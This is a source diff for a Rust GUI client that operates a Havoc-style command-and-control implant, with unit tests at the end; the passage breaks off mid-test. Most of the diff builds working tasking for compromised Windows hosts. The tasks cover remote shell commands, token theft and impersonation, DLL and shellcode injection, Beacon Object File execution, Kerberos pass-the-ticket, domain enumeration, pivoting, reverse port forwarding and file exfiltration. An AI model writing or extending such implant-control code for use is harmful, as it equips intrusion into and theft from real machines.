@@ -3408,15 +3408,17 @@ impl ClientApp {
     fn render_console_input(&mut self, ui: &mut egui::Ui, agent_id: &str) {
         let mut run_command = false;
 
+        let prompt = format_console_prompt(&self.current_operator_username(), agent_id);
+
         ui.horizontal(|ui| {
-            ui.label(RichText::new(">").strong().monospace());
+            ui.label(RichText::new(&prompt).strong().monospace());
             let response = {
                 let console = self.session_panel.console_state_mut(agent_id);
                 ui.add(
                     egui::TextEdit::singleline(&mut console.input)
                         .id_source(("console-input", agent_id))
                         .desired_width(f32::INFINITY)
-                        .hint_text("Enter a Demon command"),
+                        .hint_text("Enter a Demon command (type 'help' for available commands)"),
                 )
             };
 
@@ -3765,6 +3767,14 @@ impl ClientApp {
             return;
         }
 
+        // Handle local client-side commands first.
+        if let Some(output) = handle_local_command(&command_line) {
+            push_history_entry(console, &command_line);
+            console.input.clear();
+            self.inject_console_entry(agent_id, &command_line, &output);
+            return;
+        }
+
         if let Some(runtime) = python_runtime {
             match runtime.execute_registered_command(agent_id, &command_line) {
                 Ok(true) => {
@@ -3794,6 +3804,27 @@ impl ClientApp {
                 console.status_message = Some(error);
             }
         }
+    }
+
+    /// Inserts a locally-generated console entry into the shared app state.
+    fn inject_console_entry(&self, agent_id: &str, command_line: &str, output: &str) {
+        let app_state = match &self.phase {
+            AppPhase::Connected { app_state, .. } | AppPhase::Authenticating { app_state, .. } => {
+                app_state
+            }
+            AppPhase::Login(_) => return,
+        };
+        let mut state = match app_state.lock() {
+            Ok(state) => state,
+            Err(poisoned) => poisoned.into_inner(),
+        };
+        state.agent_consoles.entry(agent_id.to_owned()).or_default().push(AgentConsoleEntry {
+            kind: AgentConsoleEntryKind::Output,
+            command_id: "local".to_owned(),
+            received_at: String::new(),
+            command_line: Some(command_line.to_owned()),
+            output: output.to_owned(),
+        });
     }
 
     fn current_operator_username(&self) -> String {
@@ -4442,25 +4473,272 @@ enum HistoryDirection {
     Newer,
 }
 
+/// Handles client-side commands that do not require a round-trip to the teamserver.
+///
+/// Returns `Some(output)` when the input matches a local command, or `None` if the
+/// command should be forwarded to the teamserver.
+fn handle_local_command(input: &str) -> Option<String> {
+    let trimmed = input.trim();
+    let mut parts = trimmed.split_whitespace();
+    let command = parts.next()?.to_ascii_lowercase();
+
+    match command.as_str() {
+        "help" | "?" => {
+            let topic = parts.next();
+            Some(build_help_output(topic))
+        }
+        _ => None,
+    }
+}
+
+/// Builds the formatted help text.
+///
+/// When `topic` is `None`, a full command table is produced (matching Havoc's
+/// `help` output). When a specific command name is given, only that command's
+/// usage and description are shown.
+fn build_help_output(topic: Option<&str>) -> String {
+    if let Some(name) = topic {
+        let needle = name.to_ascii_lowercase();
+        let spec = CONSOLE_COMMANDS
+            .iter()
+            .find(|spec| spec.name == needle || spec.aliases.iter().any(|alias| *alias == needle));
+        return match spec {
+            Some(spec) => {
+                let mut out = format!(" {}\n", spec.name);
+                out.push_str(&format!("   Usage:       {}\n", spec.usage));
+                out.push_str(&format!("   Type:        {}\n", spec.cmd_type));
+                out.push_str(&format!("   Description: {}\n", spec.description));
+                if !spec.aliases.is_empty() {
+                    out.push_str(&format!("   Aliases:     {}\n", spec.aliases.join(", ")));
+                }
+                out
+            }
+            None => format!("Unknown command `{name}`. Type `help` for available commands."),
+        };
+    }
+
+    // Full command table.
+    let mut out = String::from(" Demon Commands\n\n");
+    out.push_str(&format!(" {:<22} {:<12} {}\n", "Command", "Type", "Description"));
+    out.push_str(&format!(" {:<22} {:<12} {}\n", "-------", "----", "-----------"));
+    for spec in &CONSOLE_COMMANDS {
+        out.push_str(&format!(" {:<22} {:<12} {}\n", spec.name, spec.cmd_type, spec.description));
+    }
+    out
+}
+
+/// Formats the Havoc-style console prompt: `[operator/AGENT_ID] demon.x64 >> `.
+fn format_console_prompt(operator: &str, agent_id: &str) -> String {
+    let op = if operator.is_empty() { "operator" } else { operator };
+    format!("[{op}/{agent_id}] demon.x64 >> ")
+}
+
 #[derive(Debug, Clone, Copy)]
 struct ConsoleCommandSpec {
     name: &'static str,
     aliases: &'static [&'static str],
     usage: &'static str,
+    cmd_type: &'static str,
+    description: &'static str,
 }
 
-const CONSOLE_COMMANDS: [ConsoleCommandSpec; 11] = [
-    ConsoleCommandSpec { name: "checkin", aliases: &[], usage: "checkin" },
-    ConsoleCommandSpec { name: "kill", aliases: &["exit"], usage: "kill [process]" },
-    ConsoleCommandSpec { name: "ps", aliases: &["proclist"], usage: "ps" },
-    ConsoleCommandSpec { name: "screenshot", aliases: &[], usage: "screenshot" },
-    ConsoleCommandSpec { name: "pwd", aliases: &[], usage: "pwd" },
-    ConsoleCommandSpec { name: "cd", aliases: &[], usage: "cd <path>" },
-    ConsoleCommandSpec { name: "mkdir", aliases: &[], usage: "mkdir <path>" },
-    ConsoleCommandSpec { name: "rm", aliases: &["del", "remove"], usage: "rm <path>" },
-    ConsoleCommandSpec { name: "download", aliases: &[], usage: "download <path>" },
-    ConsoleCommandSpec { name: "cat", aliases: &["type"], usage: "cat <path>" },
-    ConsoleCommandSpec { name: "proc", aliases: &[], usage: "proc kill <pid>" },
+const CONSOLE_COMMANDS: [ConsoleCommandSpec; 28] = [
+    ConsoleCommandSpec {
+        name: "help",
+        aliases: &["?"],
+        usage: "help [command]",
+        cmd_type: "Command",
+        description: "Show available commands or help for a specific command",
+    },
+    ConsoleCommandSpec {
+        name: "shell",
+        aliases: &[],
+        usage: "shell <command>",
+        cmd_type: "Command",
+        description: "Executes a shell command via cmd.exe",
+    },
+    ConsoleCommandSpec {
+        name: "sleep",
+        aliases: &[],
+        usage: "sleep <seconds> [jitter%]",
+        cmd_type: "Command",
+        description: "Sets the agent sleep delay and optional jitter",
+    },
+    ConsoleCommandSpec {
+        name: "checkin",
+        aliases: &[],
+        usage: "checkin",
+        cmd_type: "Command",
+        description: "Request the agent to check in immediately",
+    },
+    ConsoleCommandSpec {
+        name: "kill",
+        aliases: &["exit"],
+        usage: "kill [process]",
+        cmd_type: "Command",
+        description: "Kill the agent (thread or process)",
+    },
+    ConsoleCommandSpec {
+        name: "ps",
+        aliases: &["proclist"],
+        usage: "ps",
+        cmd_type: "Command",
+        description: "List running processes",
+    },
+    ConsoleCommandSpec {
+        name: "screenshot",
+        aliases: &[],
+        usage: "screenshot",
+        cmd_type: "Command",
+        description: "Takes a screenshot of the current desktop",
+    },
+    ConsoleCommandSpec {
+        name: "pwd",
+        aliases: &[],
+        usage: "pwd",
+        cmd_type: "Command",
+        description: "Print the current working directory",
+    },
+    ConsoleCommandSpec {
+        name: "cd",
+        aliases: &[],
+        usage: "cd <path>",
+        cmd_type: "Command",
+        description: "Change the working directory",
+    },
+    ConsoleCommandSpec {
+        name: "dir",
+        aliases: &["ls"],
+        usage: "dir <path>",
+        cmd_type: "Command",
+        description: "List files in a directory",
+    },
+    ConsoleCommandSpec {
+        name: "mkdir",
+        aliases: &[],
+        usage: "mkdir <path>",
+        cmd_type: "Command",
+        description: "Create a directory",
+    },
+    ConsoleCommandSpec {
+        name: "rm",
+        aliases: &["del", "remove"],
+        usage: "rm <path>",
+        cmd_type: "Command",
+        description: "Delete a file or directory",
+    },
+    ConsoleCommandSpec {
+        name: "cp",
+        aliases: &["copy"],
+        usage: "cp <src> <dst>",
+        cmd_type: "Command",
+        description: "Copy a file to another location",
+    },
+    ConsoleCommandSpec {
+        name: "mv",
+        aliases: &["move"],
+        usage: "mv <src> <dst>",
+        cmd_type: "Command",
+        description: "Move or rename a file",
+    },
+    ConsoleCommandSpec {
+        name: "cat",
+        aliases: &["type"],
+        usage: "cat <path>",
+        cmd_type: "Command",
+        description: "Read and display a file's contents",
+    },
+    ConsoleCommandSpec {
+        name: "download",
+        aliases: &[],
+        usage: "download <path>",
+        cmd_type: "Command",
+        description: "Download a file from the target",
+    },
+    ConsoleCommandSpec {
+        name: "upload",
+        aliases: &[],
+        usage: "upload <local> <remote>",
+        cmd_type: "Command",
+        description: "Upload a local file to the target",
+    },
+    ConsoleCommandSpec {
+        name: "proc",
+        aliases: &[],
+        usage: "proc <kill|modules|grep|create|memory> [args]",
+        cmd_type: "Command",
+        description: "Process management and inspection",
+    },
+    ConsoleCommandSpec {
+        name: "token",
+        aliases: &[],
+        usage: "token <list|steal|make|impersonate|revert|privs|uid|clear> [args]",
+        cmd_type: "Command",
+        description: "Token impersonation and management",
+    },
+    ConsoleCommandSpec {
+        name: "inline-execute",
+        aliases: &["bof"],
+        usage: "inline-execute <bof-path> [args]",
+        cmd_type: "Command",
+        description: "Execute a Beacon Object File (COFF) in-process",
+    },
+    ConsoleCommandSpec {
+        name: "inject-dll",
+        aliases: &[],
+        usage: "inject-dll <pid> <dll-path>",
+        cmd_type: "Module",
+        description: "Inject a DLL into a remote process",
+    },
+    ConsoleCommandSpec {
+        name: "inject-shellcode",
+        aliases: &[],
+        usage: "inject-shellcode <pid> <bin-path>",
+        cmd_type: "Module",
+        description: "Inject shellcode into a remote process",
+    },
+    ConsoleCommandSpec {
+        name: "spawn-dll",
+        aliases: &[],
+        usage: "spawn-dll <dll-path> [args]",
+        cmd_type: "Module",
+        description: "Spawn a sacrificial process and inject a DLL",
+    },
+    ConsoleCommandSpec {
+        name: "net",
+        aliases: &[],
+        usage: "net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]",
+        cmd_type: "Command",
+        description: "Network and Active Directory enumeration",
+    },
+    ConsoleCommandSpec {
+        name: "pivot",
+        aliases: &[],
+        usage: "pivot <list|connect|disconnect> [args]",
+        cmd_type: "Command",
+        description: "SMB pivot link management",
+    },
+    ConsoleCommandSpec {
+        name: "rportfwd",
+        aliases: &[],
+        usage: "rportfwd <add|remove|list|clear> [args]",
+        cmd_type: "Command",
+        description: "Reverse port forwarding through the agent",
+    },
+    ConsoleCommandSpec {
+        name: "kerberos",
+        aliases: &[],
+        usage: "kerberos <luid|klist|purge|ptt> [args]",
+        cmd_type: "Command",
+        description: "Kerberos ticket management",
+    },
+    ConsoleCommandSpec {
+        name: "config",
+        aliases: &[],
+        usage: "config <sleep-obf|implant.verbose|inject.spoofaddr|killdate|workinghours> [args]",
+        cmd_type: "Command",
+        description: "Modify agent runtime configuration",
+    },
 ];
 
 fn build_file_browser_list_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
@@ -4540,14 +4818,22 @@ fn build_console_task(
     let command = command.to_ascii_lowercase();
 
     let info = match command.as_str() {
-        "checkin" => AgentTaskInfo {
-            demon_id: agent_id.to_owned(),
-            task_id: format!("{:08X}", next_task_id()),
-            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
-            command_line: trimmed.to_owned(),
-            command: Some("checkin".to_owned()),
-            ..AgentTaskInfo::default()
-        },
+        // Local-only commands are handled before this function is called.
+        "help" | "?" => {
+            return Err("Use the help command for usage information.".to_owned());
+        }
+        "shell" => {
+            let shell_cmd = rest_after_word(trimmed)?;
+            simple_task(
+                agent_id,
+                trimmed,
+                DemonCommand::CommandInlineExecute,
+                "shell",
+                Some(shell_cmd),
+            )
+        }
+        "sleep" => sleep_task(agent_id, trimmed)?,
+        "checkin" => simple_task(agent_id, trimmed, DemonCommand::CommandCheckin, "checkin", None),
         "kill" | "exit" => AgentTaskInfo {
             demon_id: agent_id.to_owned(),
             task_id: format!("{:08X}", next_task_id()),
@@ -4557,38 +4843,50 @@ fn build_console_task(
             arguments: parts.next().map(ToOwned::to_owned),
             ..AgentTaskInfo::default()
         },
-        "ps" | "proclist" => AgentTaskInfo {
-            demon_id: agent_id.to_owned(),
-            task_id: format!("{:08X}", next_task_id()),
-            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
-            command_line: trimmed.to_owned(),
-            command: Some("ps".to_owned()),
-            ..AgentTaskInfo::default()
-        },
-        "screenshot" => AgentTaskInfo {
-            demon_id: agent_id.to_owned(),
-            task_id: format!("{:08X}", next_task_id()),
-            command_id: u32::from(DemonCommand::CommandScreenshot).to_string(),
-            command_line: trimmed.to_owned(),
-            command: Some("screenshot".to_owned()),
-            ..AgentTaskInfo::default()
-        },
+        "ps" | "proclist" => {
+            simple_task(agent_id, trimmed, DemonCommand::CommandProcList, "ps", None)
+        }
+        "screenshot" => {
+            simple_task(agent_id, trimmed, DemonCommand::CommandScreenshot, "screenshot", None)
+        }
         "pwd" => filesystem_task(agent_id, trimmed, "pwd", None),
         "cd" => filesystem_task(agent_id, trimmed, "cd", Some(rest_after_word(trimmed)?)),
+        "dir" | "ls" => {
+            let path = rest_after_word(trimmed)?;
+            filesystem_task(
+                agent_id,
+                trimmed,
+                "dir",
+                Some(format!("{path};true;false;false;false;;;")),
+            )
+        }
         "mkdir" => filesystem_task(agent_id, trimmed, "mkdir", Some(rest_after_word(trimmed)?)),
         "rm" | "del" | "remove" => {
             filesystem_task(agent_id, trimmed, "remove", Some(rest_after_word(trimmed)?))
         }
+        "cp" | "copy" => filesystem_copy_or_move_task(agent_id, trimmed, "cp")?,
+        "mv" | "move" => filesystem_copy_or_move_task(agent_id, trimmed, "move")?,
         "download" => {
             filesystem_transfer_task(agent_id, trimmed, "download", &rest_after_word(trimmed)?)
         }
+        "upload" => upload_console_task(agent_id, trimmed)?,
         "cat" | "type" => {
             filesystem_transfer_task(agent_id, trimmed, "cat", &rest_after_word(trimmed)?)
         }
         "proc" => process_task(agent_id, trimmed)?,
+        "token" => token_task(agent_id, trimmed)?,
+        "inline-execute" | "bof" => inline_execute_task(agent_id, trimmed)?,
+        "inject-dll" => inject_dll_console_task(agent_id, trimmed)?,
+        "inject-shellcode" => inject_shellcode_console_task(agent_id, trimmed)?,
+        "spawn-dll" => spawn_dll_console_task(agent_id, trimmed)?,
+        "net" => net_task(agent_id, trimmed)?,
+        "pivot" => pivot_task(agent_id, trimmed)?,
+        "rportfwd" => rportfwd_task(agent_id, trimmed)?,
+        "kerberos" => kerberos_task(agent_id, trimmed)?,
+        "config" => config_task(agent_id, trimmed)?,
         _ => {
-            let usage = closest_command_usage(&command)
-                .unwrap_or("Supported commands: checkin, kill, ps, screenshot, pwd, cd, mkdir, rm, download, cat, proc kill");
+            let usage =
+                closest_command_usage(&command).unwrap_or("Type `help` for available commands.");
             return Err(format!("Unsupported console command `{command}`. {usage}"));
         }
     };
@@ -4636,8 +4934,11 @@ fn filesystem_transfer_task(
 fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
     let mut parts = command_line.split_whitespace();
     let _ = parts.next();
-    let sub_command = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
-    match sub_command.to_ascii_lowercase().as_str() {
+    let sub_command = parts
+        .next()
+        .ok_or_else(|| "Usage: proc <kill|modules|grep|create|memory> [args]".to_owned())?;
+    let sub_lower = sub_command.to_ascii_lowercase();
+    match sub_lower.as_str() {
         "kill" => {
             let pid = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
             if parts.next().is_some() {
@@ -4646,7 +4947,20 @@ fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, Str
             let pid = pid.parse::<u32>().map_err(|_| format!("Invalid PID `{pid}`."))?;
             Ok(process_kill_info(agent_id, pid))
         }
-        _ => Err("Usage: proc kill <pid>".to_owned()),
+        "modules" | "grep" | "create" | "memory" => {
+            let args: String = parts.collect::<Vec<_>>().join(" ");
+            Ok(AgentTaskInfo {
+                demon_id: agent_id.to_owned(),
+                task_id: format!("{:08X}", next_task_id()),
+                command_id: u32::from(DemonCommand::CommandProc).to_string(),
+                command_line: command_line.to_owned(),
+                command: Some("proc".to_owned()),
+                sub_command: Some(sub_lower),
+                arguments: if args.is_empty() { None } else { Some(args) },
+                ..AgentTaskInfo::default()
+            })
+        }
+        _ => Err("Usage: proc <kill|modules|grep|create|memory> [args]".to_owned()),
     }
 }
 
@@ -4662,6 +4976,307 @@ fn process_kill_info(agent_id: &str, pid: u32) -> AgentTaskInfo {
         extra: BTreeMap::from([("Args".to_owned(), serde_json::Value::String(pid.to_string()))]),
         ..AgentTaskInfo::default()
     }
+}
+
+/// Builds a task with a single command ID and optional arguments string.
+fn simple_task(
+    agent_id: &str,
+    command_line: &str,
+    demon_cmd: DemonCommand,
+    command_name: &str,
+    arguments: Option<String>,
+) -> AgentTaskInfo {
+    AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(demon_cmd).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some(command_name.to_owned()),
+        arguments,
+        ..AgentTaskInfo::default()
+    }
+}
+
+fn sleep_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next(); // skip "sleep"
+    let delay = parts.next().ok_or_else(|| "Usage: sleep <seconds> [jitter%]".to_owned())?;
+    let jitter = parts.next().unwrap_or("0");
+    let delay_val: u32 = delay.parse().map_err(|_| format!("Invalid delay `{delay}`."))?;
+    let jitter_val: u32 =
+        jitter.trim_end_matches('%').parse().map_err(|_| format!("Invalid jitter `{jitter}`."))?;
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandSleep).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("sleep".to_owned()),
+        arguments: Some(format!("{delay_val};{jitter_val}")),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn filesystem_copy_or_move_task(
+    agent_id: &str,
+    command_line: &str,
+    sub_command: &str,
+) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let src = parts.next().ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
+    let dst = parts
+        .next()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
+    Ok(filesystem_task(agent_id, command_line, sub_command, Some(format!("{src};{dst}"))))
+}
+
+fn upload_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let local_path = parts.next().ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
+    let remote_path = parts
+        .next()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
+    let content =
+        std::fs::read(local_path).map_err(|err| format!("Failed to read `{local_path}`: {err}"))?;
+    let remote_b64 = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
+    let content_b64 = base64::engine::general_purpose::STANDARD.encode(&content);
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandFs).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("fs".to_owned()),
+        sub_command: Some("upload".to_owned()),
+        arguments: Some(format!("{remote_b64};{content_b64}")),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn token_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next(); // skip "token"
+    let sub = parts.next().ok_or_else(|| {
+        "Usage: token <list|steal|make|impersonate|revert|privs|uid|clear> [args]".to_owned()
+    })?;
+    let sub_lower = sub.to_ascii_lowercase();
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandToken).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("token".to_owned()),
+        sub_command: Some(sub_lower),
+        arguments: if args.is_empty() { None } else { Some(args) },
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn inline_execute_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let bof_path =
+        parts.next().ok_or_else(|| "Usage: inline-execute <bof-path> [args]".to_owned())?;
+    let bof_args = parts.next().unwrap_or_default().trim().to_owned();
+    let binary =
+        std::fs::read(bof_path).map_err(|err| format!("Failed to read `{bof_path}`: {err}"))?;
+    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandInlineExecute).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("inline-execute".to_owned()),
+        arguments: Some(if bof_args.is_empty() {
+            binary_b64
+        } else {
+            format!("{binary_b64};{bof_args}")
+        }),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn inject_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let pid_str = parts.next().ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
+    let dll_path = parts
+        .next()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
+    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
+    let binary =
+        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
+    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("inject-dll".to_owned()),
+        extra: BTreeMap::from([
+            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
+            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
+        ]),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn inject_shellcode_console_task(
+    agent_id: &str,
+    command_line: &str,
+) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let pid_str =
+        parts.next().ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
+    let bin_path = parts
+        .next()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
+    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
+    let binary =
+        std::fs::read(bin_path).map_err(|err| format!("Failed to read `{bin_path}`: {err}"))?;
+    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("inject-shellcode".to_owned()),
+        extra: BTreeMap::from([
+            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
+            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
+        ]),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn spawn_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let rest = rest_after_word(command_line)?;
+    let mut parts = rest.splitn(2, char::is_whitespace);
+    let dll_path = parts.next().ok_or_else(|| "Usage: spawn-dll <dll-path> [args]".to_owned())?;
+    let args = parts.next().unwrap_or_default().trim().to_owned();
+    let binary =
+        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
+    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
+    let args_b64 = if args.is_empty() {
+        String::new()
+    } else {
+        base64::engine::general_purpose::STANDARD.encode(args.as_bytes())
+    };
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandSpawnDll).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("spawn-dll".to_owned()),
+        extra: BTreeMap::from([
+            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
+            ("Arguments".to_owned(), serde_json::Value::String(args_b64)),
+        ]),
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn net_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next(); // skip "net"
+    let sub = parts.next().ok_or_else(|| {
+        "Usage: net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]"
+            .to_owned()
+    })?;
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandNet).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("net".to_owned()),
+        sub_command: Some(sub.to_ascii_lowercase()),
+        arguments: if args.is_empty() { None } else { Some(args) },
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn pivot_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next();
+    let sub =
+        parts.next().ok_or_else(|| "Usage: pivot <list|connect|disconnect> [args]".to_owned())?;
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandPivot).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("pivot".to_owned()),
+        sub_command: Some(sub.to_ascii_lowercase()),
+        arguments: if args.is_empty() { None } else { Some(args) },
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn rportfwd_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next();
+    let sub =
+        parts.next().ok_or_else(|| "Usage: rportfwd <add|remove|list|clear> [args]".to_owned())?;
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    let sub_lower = sub.to_ascii_lowercase();
+    let sub_full = format!("rportfwd {sub_lower}");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandSocket).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("socket".to_owned()),
+        sub_command: Some(sub_full),
+        arguments: if args.is_empty() { None } else { Some(args.replace(' ', ";")) },
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn kerberos_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next();
+    let sub =
+        parts.next().ok_or_else(|| "Usage: kerberos <luid|klist|purge|ptt> [args]".to_owned())?;
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandKerberos).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("kerberos".to_owned()),
+        sub_command: Some(sub.to_ascii_lowercase()),
+        arguments: if args.is_empty() { None } else { Some(args) },
+        ..AgentTaskInfo::default()
+    })
+}
+
+fn config_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
+    let mut parts = command_line.split_whitespace();
+    let _ = parts.next();
+    let sub = parts.next().ok_or_else(|| "Usage: config <option> [value]".to_owned())?;
+    let args: String = parts.collect::<Vec<_>>().join(" ");
+    Ok(AgentTaskInfo {
+        demon_id: agent_id.to_owned(),
+        task_id: format!("{:08X}", next_task_id()),
+        command_id: u32::from(DemonCommand::CommandConfig).to_string(),
+        command_line: command_line.to_owned(),
+        command: Some("config".to_owned()),
+        sub_command: Some(sub.to_ascii_lowercase()),
+        arguments: if args.is_empty() { None } else { Some(args) },
+        ..AgentTaskInfo::default()
+    })
 }
 
 fn rest_after_word(input: &str) -> Result<String, String> {
@@ -8626,5 +9241,266 @@ mod tests {
         assert_eq!(build_console_message_prefix("Warning"), "[!]");
         assert_eq!(build_console_message_prefix("Info"), "[*]");
         assert_eq!(build_console_message_prefix("other"), "[*]");
+    }
+
+    // ---- console prompt format tests ----
+
+    #[test]
+    fn format_console_prompt_includes_operator_and_agent_id() {
+        let prompt = format_console_prompt("alice", "DEAD1234");
+        assert_eq!(prompt, "[alice/DEAD1234] demon.x64 >> ");
+    }
+
+    #[test]
+    fn format_console_prompt_uses_fallback_when_operator_empty() {
+        let prompt = format_console_prompt("", "DEAD1234");
+        assert_eq!(prompt, "[operator/DEAD1234] demon.x64 >> ");
+    }
+
+    // ---- help command tests ----
+
+    #[test]
+    fn handle_local_command_help_returns_command_table() {
+        let output = handle_local_command("help").expect("help should be handled locally");
+        assert!(output.contains("Demon Commands"));
+        assert!(output.contains("Command"));
+        assert!(output.contains("Type"));
+        assert!(output.contains("Description"));
+        // Verify a sample of commands appear in the table.
+        assert!(output.contains("shell"));
+        assert!(output.contains("sleep"));
+        assert!(output.contains("token"));
+        assert!(output.contains("inline-execute"));
+    }
+
+    #[test]
+    fn handle_local_command_help_specific_command() {
+        let output = handle_local_command("help shell").expect("help shell should be handled");
+        assert!(output.contains("shell"));
+        assert!(output.contains("Usage:"));
+        assert!(output.contains("Description:"));
+    }
+
+    #[test]
+    fn handle_local_command_help_unknown_topic() {
+        let output = handle_local_command("help nonexistent").expect("should still return output");
+        assert!(output.contains("Unknown command"));
+    }
+
+    #[test]
+    fn handle_local_command_question_mark_alias() {
+        let output = handle_local_command("?").expect("? should work as help alias");
